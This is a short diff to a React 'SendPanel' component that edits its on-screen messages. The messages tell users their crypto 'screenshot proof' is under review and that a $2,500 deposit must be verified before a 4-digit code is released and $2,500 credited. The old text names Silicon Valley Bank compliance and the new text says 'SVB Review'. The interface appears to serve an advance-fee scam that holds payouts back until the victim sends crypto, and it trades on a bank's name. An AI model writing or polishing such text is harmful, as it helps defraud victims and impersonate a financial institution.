@@ -729,14 +729,14 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
                   </span>
                 </div>
                 <p className="text-slate-300 text-[11px] leading-relaxed">
-                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by Silicon Valley Bank compliance. Your 4-digit code will be generated upon verification.
+                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by SVB Review. Your 4-digit code will be generated upon verification.
                 </p>
               </div>
             ) : (
               <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-1">
-                <p className="font-semibold text-amber-400">Compliance Authorization Notice:</p>
+                <p className="font-semibold text-amber-400">SVB Review Authorization Notice:</p>
                 <p className="text-slate-400 leading-relaxed">
-                  Once your $2,500 deposit is verified by bank compliance, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
+                  Once your $2,500 deposit is verified by SVB Review, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
                 </p>
               </div>
             )}
